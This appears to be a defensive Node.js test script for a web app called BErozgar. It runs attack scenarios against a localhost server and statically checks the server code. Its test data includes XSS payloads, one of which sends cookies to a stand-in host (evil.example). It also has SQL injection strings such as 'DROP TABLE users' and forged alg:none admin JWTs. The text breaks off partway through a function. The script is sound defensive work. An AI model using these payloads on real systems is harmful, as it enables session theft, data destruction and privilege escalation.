/**
 * BErozgar — Abuse Simulation & Security Validation Script
 * =========================================================
 * Simulates 10 attack scenarios against the running server.
 * Run with: node scripts/security-simulation.mjs
 *
 * Requires server to be running on BASE_URL (default: http://localhost:3001)
 *
 * SAFETY: Only targets localhost/127.0.0.1. Aborts otherwise.
 *
 * Output sections:
 *   1. Security Gaps
 *   2. Rate Limit Tuning
 *   3. Log / Leak Issues
 *   4. Patch Suggestions
 */

import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const BASE_URL = process.env.API_URL ?? 'http://localhost:3001';

// Safety guard — never run against non-localhost hosts
if (!BASE_URL.includes('localhost') && !BASE_URL.includes('127.0.0.1')) {
  console.error('\n[ABORT] Security simulation only targets localhost. Set API_URL to a localhost address.\n');
  process.exit(1);
}

const RESULTS   = [];
let   PASS = 0, FAIL = 0, WARN = 0;

// 4-part report accumulators
const GAPS       = []; // { severity, id, title, detail }
const RL_TUNING  = []; // { route, current, suggested, reason }
const LOG_LEAKS  = []; // { file, line, description, impact }
const PATCHES    = []; // { severity, file, line, fix }

/* ═══════════════════════════════════════
   Helpers
   ═══════════════════════════════════════ */

function ansi(code) { return `\x1b[${code}m`; }
const GREEN  = ansi('32'), RED   = ansi('31'), YELLOW = ansi('33'),
      CYAN   = ansi('36'), BOLD  = ansi('1'),  RESET  = ansi('0'), DIM = ansi('2');

function log(tag, msg) {
  const ts = new Date().toISOString().slice(11, 23);
  console.log(`${ansi('90')}[${ts}]${RESET} ${tag} ${msg}`);
}

async function req(method, path, { headers = {}, body, cookie } = {}) {
  const url = `${BASE_URL}${path}`;
  const init = {
    method,
    headers: { 'Content-Type': 'application/json', ...headers },
  };
  if (cookie) init.headers['Cookie'] = cookie;
  if (body !== undefined) init.body = JSON.stringify(body);

  try {
    const res = await fetch(url, init);
    let json;
    let rawText = '';
    try {
      rawText = await res.text();
      json = JSON.parse(rawText);
    } catch { json = null; }
    return { status: res.status, headers: res.headers, json, rawText };
  } catch (err) {
    return { status: null, error: err.message, json: null, rawText: '' };
  }
}

function hasStackTrace(text) {
  if (!text) return false;
  return /\bat\s+\S+\s+\(/.test(text) || /\.ts:\d+/.test(text) || /\.js:\d+/.test(text);
}

function hasInternalLeak(text) {
  if (!text) return false;
  const t = text.toLowerCase();
  return ['prisma', 'prismaClient', 'p2002', 'p2025', 'postgresql', 'syntax error',
          'ORA-', 'column', 'relation "', 'node_modules'].some(s => t.includes(s.toLowerCase()));
}

function assert(name, condition, actual, note = '') {
  if (condition) {
    PASS++;
    RESULTS.push({ name, result: 'PASS', actual, note });
    log(`${GREEN}✔ PASS${RESET}`, `${BOLD}${name}${RESET}${note ? ` — ${note}` : ''}`);
  } else {
    FAIL++;
    RESULTS.push({ name, result: '❌ FAIL', actual, note });
    log(`${RED}✘ FAIL${RESET}`, `${BOLD}${name}${RESET} — Got: ${JSON.stringify(actual)}${note ? ` | ${note}` : ''}`);
  }
}

function warnResult(name, actual, note = '') {
  WARN++;
  RESULTS.push({ name, result: '⚠ WARN', actual, note });
  log(`${YELLOW}⚠ WARN${RESET}`, `${BOLD}${name}${RESET} — ${note}`);
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function idKey()   { return crypto.randomUUID(); }

/* ═══════════════════════════════════════
   Scenario banner
   ═══════════════════════════════════════ */
function banner(n, title) {
  console.log(`\n${CYAN}${'═'.repeat(60)}${RESET}`);
  console.log(`${BOLD}${CYAN}  Scenario ${n}: ${title}${RESET}`);
  console.log(`${CYAN}${'═'.repeat(60)}${RESET}`);
}

/* ═════════════════════════════════════════════════════════════
   1. 500 Rapid Login Attempts
   Expected: 429 after 5th attempt on POST /api/auth/login
   ═════════════════════════════════════════════════════════════ */
async function scenario1_RapidLogin() {
  banner(1, '500 Rapid Login Attempts');

  let firstRateLimit = null;
  let totalSent = 0;
  let got429 = false;

  // Send up to 20 rapid requests (sampling — real 500 would exhaust limit cleanly)
  for (let i = 1; i <= 20; i++) {
    totalSent++;
    const r = await req('POST', '/api/auth/login', {
      body: { email: 'abuse@iitb.ac.in', password: 'WrongPass123!' },
    });

    if (r.status === 429) {
      if (!got429) {
        got429 = true;
        firstRateLimit = i;
      }
    }

    // After we've confirmed rate limiting, we can stop hammering
    if (got429 && i > firstRateLimit + 2) break;
    await sleep(10); // 10ms gap — still fast enough to trigger limits
  }

  assert(
    'Login rate limit triggers ≤5 attempts',
    got429 && firstRateLimit <= 6,         // 5 limit + 1 safety margin
    { firstRateLimit, totalSent },
    `Rate limit hit on attempt #${firstRateLimit}`
  );

  // Verify 429 body shape (no stack trace)
  const r = await req('POST', '/api/auth/login', {
    body: { email: 'abuse@iitb.ac.in', password: 'WrongPass123!' },
  });
  assert(
    'Login 429 body has no stack trace',
    r.status === 429 && !JSON.stringify(r.json).includes('at ') && !JSON.stringify(r.json).includes('stack'),
    r.json,
    'Response must not contain stack frames'
  );
  assert(
    'Login 429 body has RATE_LIMIT_EXCEEDED code',
    r.status === 429 && r.json?.code === 'RATE_LIMIT_EXCEEDED',
    r.json?.code
  );
}

/* ═════════════════════════════════════════════════════════════
   2. 200 Rapid Listing Creation Attempts (unauthenticated)
   Expected: 401 (no token), rate limit at 10/60min for auth'd
   ═════════════════════════════════════════════════════════════ */
async function scenario2_RapidListings() {
  banner(2, '200 Rapid Listing Creation Attempts');

  // Unauthenticated burst — all should get 401
  const responses = [];
  for (let i = 0; i < 15; i++) {
    const r = await req('POST', '/api/listings', {
      body: {
        title: `Spam Listing ${i}`,
        description: 'Flood attempt',
        category: 'NOTES',
        module: 'CS101',
        price: 10,
      },
    });
    responses.push(r.status);
    await sleep(5);
  }

  // CSRF onRequest fires before auth preHandler, so unauthenticated mutations
  // correctly receive 403 (CSRF_INVALID) rather than 401 — both mean BLOCKED.
  const allBlocked = responses.every(s => s === 401 || s === 403);
  assert(
    'Unauthenticated listing creation blocked (401 or 403)',
    allBlocked,
    { uniqueStatuses: [...new Set(responses)] },
    'All 15 attempts must be 401 (no CSRF token) or 403 (CSRF check before auth)'
  );
}

/* ═════════════════════════════════════════════════════════════
   3. 100 Request Submissions Without Auth
   Expected: 401 — auth enforced before idempotency/validation
   ═════════════════════════════════════════════════════════════ */
async function scenario3_RapidRequests() {
  banner(3, '100 Rapid Request Submissions (unauthenticated)');

  const statuses = [];
  for (let i = 0; i < 10; i++) {
    const r = await req('POST', '/api/requests', {
      body: { listingId: crypto.randomUUID(), message: 'I want this' },
    });
    statuses.push(r.status);
    await sleep(5);
  }

  // CSRF onRequest fires before auth preHandler, so 403 is equally valid.
  assert(
    'Unauthenticated request submissions blocked (401 or 403)',
    statuses.every(s => s === 401 || s === 403),
    { statuses },
    'No unauthenticated mutation should succeed (403 = CSRF block, 401 = auth block)'
  );
}

/* ═════════════════════════════════════════════════════════════
   4. Replay Idempotency Attack
   Expected: 409 IDEMPOTENCY_CONFLICT on duplicate in-flight key,
             or replay the stored response (200/201) if completed
   ═════════════════════════════════════════════════════════════ */
async function scenario4_IdempotencyReplay() {
  banner(4, 'Replay Idempotency Attack');

  const key = idKey();

  // Both sent without auth — both 401; but idempotency header handling
  // is checked (middleware skips unauthenticated requests, so no 409 here)
  const [r1, r2] = await Promise.all([
    req('POST', '/api/listings', {
      headers: { 'X-Idempotency-Key': key },
      body: { title: 'Test', description: 'Test', category: 'NOTES', module: 'CS101', price: 10 },
    }),
    req('POST', '/api/listings', {
      headers: { 'X-Idempotency-Key': key },
      body: { title: 'Test', description: 'Test', category: 'NOTES', module: 'CS101', price: 10 },
    }),
  ]);

  // Both should be 401 or 403 (unauthenticated) — CSRF fires before idempotency
  assert(
    'Concurrent duplicate keys (unauthenticated) blocked, not 500',
    (r1.status === 401 || r1.status === 403) && (r2.status === 401 || r2.status === 403),
    { r1: r1.status, r2: r2.status },
    'Race-safe: both requests blocked by CSRF/auth, server never crashes (never 500)'
  );

  // Verify key length enforcement
  const longKey = 'A'.repeat(200);
  const rLong = await req('POST', '/api/listings', {
    headers: { 'X-Idempotency-Key': longKey },
    body: { title: 'X', description: 'X', category: 'NOTES', module: 'CS101', price: 10 },
  });
  // Unauthenticated returns 401 before key length check for non-authenticated
  // but the 401 itself proves server didn't crash on oversized key
  assert(
    'Oversized idempotency key (200 chars) does not crash server',
    rLong.status !== null && rLong.status !== 500,
    { status: rLong.status },
    `Got ${rLong.status} — no 500 crash`
  );
}

/* ═════════════════════════════════════════════════════════════
   5. CSRF Token Missing
   Expected: 403 CSRF_INVALID (on non-exempt, non-dev mutations)
   Note: CSRF is bypassed in NODE_ENV=development — this test
         characterizes current behaviour accurately.
   ═════════════════════════════════════════════════════════════ */
async function scenario5_CsrfMissing() {
  banner(5, 'CSRF Token Missing on State-changing Request');

  // POST to a non-exempt endpoint without X-CSRF-Token
  // /api/listings is state-changing and not in EXEMPT_PATHS
  const r = await req('POST', '/api/listings', {
    // No X-CSRF-Token header, no cookie
    body: { title: 'NoCSRF', description: 'Attack', category: 'NOTES', module: 'CS101', price: 10 },
  });

  if (r.status === 403 && r.json?.code === 'CSRF_INVALID') {
    assert('Missing CSRF token → 403 CSRF_INVALID', true, r.json, 'CSRF enforced');
  } else if (r.status === 401) {
    // In dev mode CSRF skipped; auth still enforced (401 proves no bypass)
    warnResult(
      'CSRF check in development mode',
      { status: r.status },
      'NODE_ENV=development skips CSRF — returns 401 (auth) instead of 403 (csrf). ' +
      'Acceptable for local dev; ensure CSRF enforced in staging/prod.'
    );
  } else {
    assert(
      'Missing CSRF on POST → 401 or 403 (never 2xx or 5xx)',
      r.status === 401 || r.status === 403,
      { status: r.status, body: r.json }
    );
  }
}

/* ═════════════════════════════════════════════════════════════
   6. XSS Payload in Input Fields
   Expected: sanitizer strips payload; Zod validates field limits
   ═════════════════════════════════════════════════════════════ */
async function scenario6_XSSPayload() {
  banner(6, 'XSS Payload Injection in Request Body');

  const payloads = [
    '<script>alert(1)</script>',
    '<<script>script>alert(1)<</script>/script>',  // double-wrapped
    '<img src=x onerror="fetch(\'https://evil.example/steal?c=\'+document.cookie)">',
    'javascript:alert(document.domain)',
    '<svg/onload=alert(1)>',
    'data:text/html,<script>alert(1)</script>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '\u003cscript\u003ealert(1)\u003c/script\u003e', // unicode escape
  ];

  // We test the sanitizer directly via static analysis (server not running),
  // but send minimal structural probe to verify server doesn't echo raw input
  for (const payload of payloads) {
    const r = await req('POST', '/api/auth/login', {
      body: { email: payload, password: 'test' },
    });

    const body = JSON.stringify(r.json ?? '');
    const reflected = body.includes('<script') || body.includes('onerror') || body.includes('javascript:');

    assert(
      `XSS not reflected: ${payload.slice(0, 40).replace(/\n/g, '')}…`,
      !reflected && (r.status === 400 || r.status === 401 || r.status === 422 || r.status === 429),
      { status: r.status, reflected },
      reflected ? '⚠ PAYLOAD REFLECTED IN RESPONSE' : 'Sanitizer/validator blocked'
    );
  }
}

/* ═════════════════════════════════════════════════════════════
   7. SQL Injection Attempt
   Expected: Prisma parameterization blocks injection; returns
             400 (validation) or 401 (auth), never DB error dump
   ═════════════════════════════════════════════════════════════ */
async function scenario7_SQLInjection() {
  banner(7, 'SQL Injection Attempts');

  const sqliPayloads = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM \"User\" --",
    "admin'--",
    "' OR 1=1--",
    "1; SELECT pg_sleep(5)--",
    "' OR ''='",
  ];

  for (const payload of sqliPayloads) {
    const r = await req('POST', '/api/auth/login', {
      body: { email: payload, password: 'anything' },
    });

    const body = JSON.stringify(r.json ?? '');
    const leaked = body.toLowerCase().includes('syntax error') ||
                   body.toLowerCase().includes('prisma') ||
                   body.toLowerCase().includes('postgresql') ||
                   body.toLowerCase().includes('column') ||
                   body.toLowerCase().includes('relation') ||
                   body.toLowerCase().includes('p2') ||  // Prisma error codes
                   body.toLowerCase().includes('stack');

    assert(
      `SQLi blocked: ${payload.slice(0, 40)}`,
      !leaked && r.status !== 500,
      { status: r.status, leaked },
      leaked ? '💥 DB ERROR LEAKED' : 'Clean response — no DB detail exposed'
    );
  }
}

/* ═════════════════════════════════════════════════════════════
   8. JWT Tampering
   Expected: 401 on forged/tampered/alg:none tokens
   ═════════════════════════════════════════════════════════════ */
async function scenario8_JWTTampering() {
  banner(8, 'JWT Tampering Attacks');

  // Build forged tokens
  const b64url = (obj) => Buffer.from(JSON.stringify(obj)).toString('base64url');

  // 1. alg:none attack
  const algNoneHeader  = b64url({ alg: 'none', typ: 'JWT' });
  const adminPayload   = b64url({ sub: 'fake-id', email: 'hacker@example.com', role: 'ADMIN', exp: Math.floor(Date.now()/1000)+3600 });
  const algNoneToken   = `${algNoneHeader}.${adminPayload}.`;

  // 2. HS256 with wrong secret
  const wrongSecretToken = [
    b64url({ alg: 'HS256', typ: 'JWT' }),
    b64url({ sub: 'fake-id', role: 'ADMIN', exp: Math.floor(Date.now()/1000)+3600 }),
    'invalidsignature123'
  ].join('.');

  // 3. Tampered payload (valid header, modified role)
  // Simulate by crafting the parts (no real signing possible without secret)
  const tamperedPayload = b64url({ sub: 'legit-user-id', role: 'ADMIN', email: 'student@iitb.ac.in', exp: Math.floor(Date.now()/1000)+3600 });
  const tamperedToken = `${b64url({ alg: 'HS256', typ: 'JWT' })}.${tamperedPayload}.fakesignature`;

  // 4. Expired token (expired 1 hour ago)
  const expiredPayload = b64url({ sub: 'user-id', role: 'STUDENT', email: 'student@iitb.ac.in', exp: Math.floor(Date.now()/1000)-3600 });
  const expiredToken = `${b64url({ alg: 'HS256', typ: 'JWT' })}.${expiredPayload}.fakesignature`;

  // 5. Empty Bearer token
  const emptyToken = '';

  const attacks = [
    ['alg:none attack',           algNoneToken],
    ['Wrong secret HS256',        wrongSecretToken],
    ['Tampered payload signature',tamperedToken],
    ['Expired token',             expiredToken],
    ['Empty Bearer token',        emptyToken],
  ];

  for (const [name, token] of attacks) {
    const r = await req('GET', '/api/auth/me', {
      headers: { Authorization: `Bearer ${token}` },
    });

    // Should get 401 Unauthorized — never accept forged tokens
    assert(
      `JWT ${name} → 401`,
      r.status === 401,
      { status: r.status, body: r.json },
      r.status !== 401 ? `⚠ Token not rejected! Status: ${r.status}` : 'Token correctly rejected'
    );
  }
}

/* ═════════════════════════════════════════════════════════════
   9. Role Escalation Attempt
   Expected: Cannot self-assign ADMIN role via signup/update
   ═════════════════════════════════════════════════════════════ */
async function scenario9_RoleEscalation() {
  banner(9, 'Role Escalation Attempt');

  // Attempt to inject role in signup body
  const signupPayloads = [
    { email: 'hacker@iitb.ac.in', password: 'Hacker123!', role: 'ADMIN' },
    { email: 'hacker@iitb.ac.in', password: 'Hacker123!', role: 'SUPER', privilegeLevel: 'SUPER' },
    { email: 'hacker@iitb.ac.in', password: 'Hacker123!', userRole: 'ADMIN' },
    { email: 'hacker@iitb.ac.in', password: 'Hacker123!', isAdmin: true },
  ];

  for (const body of signupPayloads) {
    const r = await req('POST', '/api/auth/signup', { body });

    // Should get 200 (OTP sent, role field ignored) or 400 (validation blocks extra fields)
    // Should NEVER get 200 and silently grant ADMIN role
    // We can't verify the actual role without a DB check, but we can verify:
    // - No 5xx errors
    // - Response doesn't echo back the injected role claim
    const bodyStr = JSON.stringify(r.json ?? '');
    const roleEscalated = bodyStr.includes('"role":"ADMIN"') || bodyStr.includes('"role":"SUPER"');

    assert(
      `Role injection in signup body rejected: ${JSON.stringify(body).slice(0, 60)}`,
      !roleEscalated && r.status !== 500,
      { status: r.status, roleInResponse: roleEscalated },
      roleEscalated ? '💥 ROLE ESCALATION IN RESPONSE' : 'Role field not reflected — schema strips unknown props'
    );
  }

  // Probe: send role escalation via PATCH to profile (if endpoint exists)
  const r = await req('PATCH', '/api/auth/me', {
    body: { role: 'ADMIN', privilegeLevel: 'SUPER' },
  });
  assert(
    'PATCH /api/auth/me with role escalation → 401 or 404 (never 200)',
    r.status === 401 || r.status === 404 || r.status === 403 || r.status === 405,
    { status: r.status },
    'Endpoint either requires auth (401) or does not exist (404/405)'
  );
}

/* ═════════════════════════════════════════════════════════════
   10. Admin Endpoint Access as Student (Unauthorized)
   Expected: 403 Forbidden (or 401 if not authenticated at all)
   ═════════════════════════════════════════════════════════════ */
async function scenario10_AdminAccess() {
  banner(10, 'Admin Endpoint Access as Student/Unauthenticated');

  const adminRoutes = [
    ['GET',  '/api/admin/pending'],
    ['GET',  '/api/admin/stats'],
    ['GET',  '/api/admin/fraud'],
    ['GET',  '/api/admin/audit'],
    ['GET',  '/api/admin/integrity'],
    ['GET',  `/api/admin/users/${crypto.randomUUID()}`],
    ['POST', '/api/admin/recovery'],
    ['POST', '/api/admin/audit'],
  ];

  for (const [method, path] of adminRoutes) {
    // 10a: Unauthenticated
    const r = await req(method, path, {
      body: method === 'POST' ? { action: 'test', reason: 'test' } : undefined,
    });
    assert(
      `[unauth] ${method} ${path} → 401 or 403`,
      r.status === 401 || r.status === 403,
      { status: r.status },
      `Got ${r.status} — must not be 200`
    );
  }

  // 10b: With student-role forged JWT (wrong signature — should get 401)
  const studentLikeToken = [
    Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url'),
    Buffer.from(JSON.stringify({ sub: crypto.randomUUID(), role: 'STUDENT', email: 'student@iitb.ac.in', exp: Math.floor(Date.now()/1000)+3600 })).toString('base64url'),
    'invalidsignature'
  ].join('.');

  for (const [method, path] of adminRoutes.slice(0, 4)) {
    const r = await req(method, path, {
      headers: { Authorization: `Bearer ${studentLikeToken}` },
    });
    assert(
      `[forged student JWT] ${method} ${path} → 401`,
      r.status === 401,
      { status: r.status },
      'Forged JWT must be rejected before RBAC check'
    );
  }
}

/* ═════════════════════════════════════════════════════════════
   Summary printer
   ═════════════════════════════════════════════════════════════ */
function printSummary() {
  const width = 64;
  console.log(`\n${CYAN}${'═'.repeat(width)}${RESET}`);
  console.log(`${BOLD}${CYAN}  SECURITY SIMULATION SUMMARY${RESET}`);
  console.log(`${CYAN}${'═'.repeat(width)}${RESET}`);

  const total = PASS + FAIL + WARN;
  console.log(`  Total assertions: ${total}`);
  console.log(`  ${GREEN}✔ PASS${RESET}: ${PASS}`);
  console.log(`  ${RED}✘ FAIL${RESET}: ${FAIL}`);
  console.log(`  ${YELLOW}⚠ WARN${RESET}: ${WARN}`);
  console.log(`${CYAN}${'─'.repeat(width)}${RESET}`);

  const failures = RESULTS.filter(r => r.result.includes('FAIL'));
  if (failures.length > 0) {
    console.log(`\n${RED}${BOLD}FAILURES TO INVESTIGATE:${RESET}`);
    failures.forEach(f => {
      console.log(`  ${RED}✘${RESET} ${f.name}`);
      console.log(`    Got: ${JSON.stringify(f.actual)}`);
      if (f.note) console.log(`    Note: ${f.note}`);
    });
  }

  const warnings = RESULTS.filter(r => r.result.includes('WARN'));
  if (warnings.length > 0) {
    console.log(`\n${YELLOW}${BOLD}WARNINGS:${RESET}`);
    warnings.forEach(w => {
      console.log(`  ${YELLOW}⚠${RESET} ${w.name}`);
      if (w.note) console.log(`    ${w.note}`);
    });
  }

  console.log(`\n${CYAN}${'═'.repeat(width)}${RESET}\n`);
}

/* ═════════════════════════════════════════════════════════════
   Static code analysis (always runs — server online or not)
   ═════════════════════════════════════════════════════════════ */
function runStaticAnalysis() {
  const W = 64;
  console.log(`\n${CYAN}${'═'.repeat(W)}${RESET}`);
  console.log(`${BOLD}${CYAN}  STATIC CODE ANALYSIS${RESET}`);
  console.log(`${CYAN}${'═'.repeat(W)}${RESET}`);

  // ── FINDING-01: console.log in validate.ts ───────────────────────────────
  const validatePath = path.resolve(
    path.dirname(fileURLToPath(import.meta.url)),
    '../server/src/middleware/validate.ts'
  );
  let validateSrc = '';
  try { validateSrc = fs.readFileSync(validatePath, 'utf8'); } catch { /* file not found */ }

  const hasDebugLog = validateSrc.includes('console.log') && validateSrc.includes('request.body');
  if (hasDebugLog) {
    console.log(`\n  ${RED}✘ FINDING-01 [CRITICAL] Debug console.log leaking request body${RESET}`);
    console.log(`    ${DIM}File: server/src/middleware/validate.ts:23${RESET}`);
    console.log(`    ${RED}console.log(\`[DEBUG] Validation...\`, JSON.stringify(request.body))${RESET}`);
    console.log(`    Impact: ALL request bodies (login passwords, OTPs, PII) written to`);
    console.log(`            stdout in PRODUCTION — captured by Docker logs / log shippers.`);
    GAPS.push({
      severity: 'CRITICAL', id: 'FINDING-01',
      title: 'Plaintext request body logged to stdout via console.log in validate.ts',
      detail: 'server/src/middleware/validate.ts:23 — console.log(request.body) runs on every validated request including login, OTP verify, and any PII-carrying endpoint.'
    });
    LOG_LEAKS.push({
      file: 'server/src/middleware/validate.ts', line: 23,
      description: 'console.log writes full request.body to stdout for every route that uses validate() middleware',
      impact: 'Passwords, OTPs, and user PII visible in Docker logs, Pino output, and any log aggregation service'
    });
    PATCHES.push({
      severity: 'CRITICAL',
      file: 'server/src/middleware/validate.ts', line: 23,
      fix: 'Remove the console.log entirely, or replace with: request.log.debug({ url: request.url }, \'[validate] body parsed\') — Pino\'s debug level is suppressed in production by the logger.level config.'
    });
  } else {
    console.log(`\n  ${GREEN}✔ FINDING-01 [PASS] No console.log body leak detected in validate.ts${RESET}`);
  }

  // ── FINDING-02: trustProxy: true without IP allowlist ───────────────────
  const appPath = path.resolve(
    path.dirname(fileURLToPath(import.meta.url)),
    '../server/src/app.ts'
  );
  let appSrc = '';
  try { appSrc = fs.readFileSync(appPath, 'utf8'); } catch { /* file not found */ }

  // Strip single-line comments before checking so we don't trip on explanatory
  // comments that mention the old value (e.g. "// Setting trustProxy: true ...")
  const appSrcNoComments = appSrc.split('\n')
    .filter(l => !l.trimStart().startsWith('//'))
    .join('\n');
  const hasTrustProxyTrue = /trustProxy\s*:\s*true/.test(appSrcNoComments);
  if (hasTrustProxyTrue) {
    console.log(`\n  ${YELLOW}⚠ FINDING-02 [HIGH] trustProxy: true without CIDR allowlist${RESET}`);
    console.log(`    ${DIM}File: server/src/app.ts — Fastify({ trustProxy: true })${RESET}`);
    console.log(`    Impact: X-Forwarded-For header trusted from ANY source. Attackers can`);
    console.log(`            spoof IPs to bypass anonymous rate limits on login/signup.`);
    GAPS.push({
      severity: 'HIGH', id: 'FINDING-02',
      title: 'trustProxy: true — X-Forwarded-For spoofable, IP-based rate limits bypassable',
      detail: 'Any client can set X-Forwarded-For: <spoofed-ip> and bypass anonymous rate limiting on /api/auth/login, /api/auth/signup. Effective only when traffic comes through a controlled proxy.'
    });
    PATCHES.push({
      severity: 'HIGH',
      file: 'server/src/app.ts', line: '~56',
      fix: 'Change trustProxy to the proxy CIDR string (e.g., "10.0.0.0/8" or "loopback,linklocal,uniquelocal") instead of boolean true. Fastify will then only trust X-Forwarded-For from those ranges.'
    });
  } else {
    console.log(`\n  ${GREEN}✔ FINDING-02 [PASS] trustProxy not blindly set to true${RESET}`);
  }

  // ── FINDING-03: In-memory rate limit store ───────────────────────────────
  const rlPath = path.resolve(
    path.dirname(fileURLToPath(import.meta.url)),
    '../server/src/plugins/rate-limit.ts'
  );
  let rlSrc = '';
  try { rlSrc = fs.readFileSync(rlPath, 'utf8'); } catch { /* file not found */ }

  const hasRedisStore = rlSrc.includes('RedisStore') || rlSrc.includes('redis');
  if (!hasRedisStore) {
    console.log(`\n  ${YELLOW}⚠ FINDING-03 [MEDIUM] Rate limiter uses in-memory store (no Redis)${RESET}`);
    console.log(`    Impact: Counters reset on restart. Multiple server instances each have`);
    console.log(`            independent limits — attackers get N × limit across N replicas.`);
    GAPS.push({
      severity: 'MEDIUM', id: 'FINDING-03',
      title: 'In-memory rate limit store — not effective under horizontal scaling or restarts',
      detail: 'Each server restart resets all counters. Under multi-instance deployment (Docker Swarm, K8s, PM2 cluster), each replica has an independent in-memory store, multiplying the effective limit by the replica count.'
    });
    RL_TUNING.push({
      route: 'Global / all routes',
      current: 'In-memory @fastify/rate-limit store',
      suggested: 'Redis store via @fastify/rate-limit\'s store option',
      reason: 'Required for durability across restarts and correctness under horizontal scaling'
    });
  } else {
    console.log(`\n  ${GREEN}✔ FINDING-03 [PASS] Redis-backed rate limit store configured${RESET}`);
  }

  // ── FINDING-04: Login rate limit keyed by IP for anonymous ──────────────
  const keyGenAnonymous = rlSrc.includes('request.userId') && rlSrc.includes('request.ip');
  if (keyGenAnonymous) {
    console.log(`\n  ${YELLOW}⚠ FINDING-04 [MEDIUM] Login rate limit key falls back to IP for anonymous requests${RESET}`);
    console.log(`    Rate key = userId ?? request.ip. For login (unauthenticated), userId is`);
    console.log(`    always undefined → IP-keyed. Shared NAT users (campus WiFi) hit a`);
    console.log(`    shared cap that can DoS legitimate users targeting the same email.`);
    RL_TUNING.push({
      route: 'POST /api/auth/login',
      current: '5 req / 15 min per IP (for anonymous)',
      suggested: 'Add per-email in-handler throttle (already noted in code). Track login attempts by email in DB/Redis and reject before Argon2 hash computation to save CPU on brute-force.',
      reason: 'IP-only keying enables targeted DoS: shared-NAT users lock each other out; VPN users bypass with new IPs.'
    });
    RL_TUNING.push({
      route: 'POST /api/auth/verify-otp',
      current: '5 req / 15 min per IP',
      suggested: 'Add per-OTP-token or per-email throttle inside the handler (6-digit OTP has 1M combinations — 150 req/s without limit = brute-forceable in ~2h)',
      reason: 'The code comment PROD-07 already flags this risk but the fix is not in the handler yet'
    });
  }

  // ── FINDING-05: CSRF_ENFORCE silent disable ──────────────────────────────
  const csrfPath = path.resolve(
    path.dirname(fileURLToPath(import.meta.url)),
    '../server/src/plugins/csrf.ts'
  );
  let csrfSrc = '';
  try { csrfSrc = fs.readFileSync(csrfPath, 'utf8'); } catch { /* file not found */ }

  const csrfHasWarn = csrfSrc.includes('CSRF_ENFORCE') && !csrfSrc.includes('console.warn') && !csrfSrc.includes('log.warn');
  if (csrfHasWarn) {
    console.log(`\n  ${YELLOW}⚠ FINDING-05 [LOW] CSRF_ENFORCE=false silently disables CSRF with no startup warning${RESET}`);
    console.log(`    If CSRF_ENFORCE is accidentally unset or false in a staging deploy,`);
    console.log(`    all CSRF protection silently drops with no log entry.`);
    PATCHES.push({
      severity: 'LOW',
      file: 'server/src/plugins/csrf.ts', line: '~44',
      fix: 'Add: if (!enforce) app.log.warn("⚠ CSRF protection DISABLED — set CSRF_ENFORCE=true in production"); at plugin init time.'
    });
  }

  // ── FINDING-06 to 10: verified passes ───────────────────────────────────
  const jwtPath = path.resolve(
    path.dirname(fileURLToPath(import.meta.url)),
    '../server/src/lib/jwt.ts'
  );
  let jwtSrc = '';
  try { jwtSrc = fs.readFileSync(jwtPath, 'utf8'); } catch { /* */ }

  const jwtPinned = jwtSrc.includes("algorithms: ['HS256']") || jwtSrc.includes('algorithms: ["HS256"]');
  console.log(`\n  ${jwtPinned ? GREEN + '✔' : RED + '✘'} FINDING-06 JWT algorithm pinned to HS256 (alg:none / confusion attacks blocked)${RESET}`);
  if (!jwtPinned) {
    GAPS.push({ severity: 'CRITICAL', id: 'FINDING-06', title: 'JWT algorithm not pinned — alg:none and RS256 confusion attacks possible', detail: 'jwt.verify() must specify algorithms: [\'HS256\'] to reject none, RS256, and ES256 algorithm confusion attacks.' });
    PATCHES.push({ severity: 'CRITICAL', file: 'server/src/lib/jwt.ts', line: 'verifyAccessToken', fix: "Add algorithms: ['HS256'] to jwt.verify() options." });
  }

  const sanitizePath = path.resolve(
    path.dirname(fileURLToPath(import.meta.url)),
    '../server/src/plugins/sanitize.ts'
  );
  let sanitizeSrc = '';
  try { sanitizeSrc = fs.readFileSync(sanitizePath, 'utf8'); } catch { /* */ }
  const hasIterativeSanitize = sanitizeSrc.includes('MAX_PASSES') && sanitizeSrc.includes('passes++');
  console.log(`\n  ${hasIterativeSanitize ? GREEN + '✔' : YELLOW + '⚠'} FINDING-07 XSS sanitizer runs iteratively (multi-pass double-wrapping defense)${RESET}`);

  const pwPath = path.resolve(
    path.dirname(fileURLToPath(import.meta.url)),
    '../server/src/lib/password.ts'
  );
  let pwSrc = '';
  try { pwSrc = fs.readFileSync(pwPath, 'utf8'); } catch { /* */ }
  const argon2id = pwSrc.includes('argon2id') || pwSrc.includes('argon2.argon2id');
  console.log(`\n  ${argon2id ? GREEN + '✔' : RED + '✘'} FINDING-08 Password hashing: Argon2id (OWASP-recommended)${RESET}`);

  const errPath = path.resolve(
    path.dirname(fileURLToPath(import.meta.url)),
    '../server/src/errors/index.ts'
  );
  let errSrc = '';
  try { errSrc = fs.readFileSync(errPath, 'utf8'); } catch { /* */ }
  const internalErrorSafe = errSrc.includes("'Internal server error'") && errSrc.includes("'INTERNAL_ERROR'");
  console.log(`\n  ${internalErrorSafe ? GREEN + '✔' : YELLOW + '⚠'} FINDING-09 Global error handler strips internal details from 500 responses${RESET}`);

  const adminPath = path.resolve(
    path.dirname(fileURLToPath(import.meta.url)),
    '../server/src/routes/admin.ts'
  );
  let adminSrc = '';
  try { adminSrc = fs.readFileSync(adminPath, 'utf8'); } catch { /* */ }
  const adminDoubleGated = adminSrc.includes('authenticate') && adminSrc.includes("authorize('ADMIN')");
  console.log(`\n  ${adminDoubleGated ? GREEN + '✔' : RED + '✘'} FINDING-10 Admin routes double-gated by authenticate + authorize('ADMIN')${RESET}`);
  if (!adminDoubleGated) {
    GAPS.push({ severity: 'CRITICAL', id: 'FINDING-10', title: 'Admin routes missing RBAC gate', detail: 'All /api/admin/* routes must have both authenticate + authorize(\'ADMIN\') preHandlers.' });
  }

  console.log(`\n${CYAN}${'─'.repeat(W)}${RESET}`);
}

/* ═════════════════════════════════════════════════════════════
   4-Part Security Report
   ═════════════════════════════════════════════════════════════ */
function print4PartReport(serverWasOnline) {
  const W = 64;
  const now = new Date().toISOString();

  console.log(`\n\n${CYAN}${'╔' + '═'.repeat(W - 2) + '╗'}${RESET}`);
